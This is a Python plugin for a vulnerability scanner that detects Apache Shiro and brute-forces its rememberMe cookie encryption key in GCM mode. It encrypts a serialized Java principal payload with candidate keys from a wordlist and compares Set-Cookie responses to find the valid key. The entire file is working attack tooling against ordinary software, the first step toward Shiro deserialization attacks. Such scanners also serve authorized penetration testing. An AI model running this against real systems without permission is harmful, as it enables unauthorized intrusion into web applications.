import base64
from Cryptodome.Cipher import AES
import uuid
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger, random_choices
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.BRUTE
        self.vul_name = "Shiro GCM 弱密钥"
        self.app_name = 'Shiro'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

        self.username_file = "username_shiro.txt"
        self.password_file = "password_shiro.txt"
        self.shuffle_auth_list = True
        self._cookie_name = "rememberMe"
        self._check_value = self._cookie_name + "=deleteMe"
        self._remember_me_count = -1

    def login(self, target, user, passwd):
        return self.check_key(passwd)

    def check_app(self, target):
        set_cookie = self.send_encrypt("1")
        count = set_cookie.count(self._check_value)
        if count > 0:
            self._remember_me_count = count
            self.logger.debug("found shiro {}  count {}".format(target, count))
            if self.check_key('dGhpc25vdGFrZXlhYWN6eg=='):
                self.logger.info("{} may be have waf".format(target))
                return False

            return True
        else:
            return False

    def send_encrypt(self, data):
        url = self.target + "/"
        url = url + "?" + random_choices() + "=" + random_choices()
        headers = {
            "Cookie": '{}={}'.format(self._cookie_name, data)
        }
        set_cookie = http_req(url, headers=headers).headers.get('Set-Cookie', "")
        return set_cookie

    def check_key(self, key):
        payload = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
        data = shiro_gcm(key, payload).decode()
        set_cookie = self.send_encrypt(data)
        count = set_cookie.count(self._check_value)
        if count + 1 == self._remember_me_count:
            return True


def shiro_gcm(key, data):
    iv = uuid.uuid4().bytes
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)
    ciphertext, tag = cipher.encrypt_and_digest(base64.b64decode(data))
    e_text = iv + ciphertext + tag
    base64_ciphertext = base64.b64encode(e_text)
    return base64_ciphertext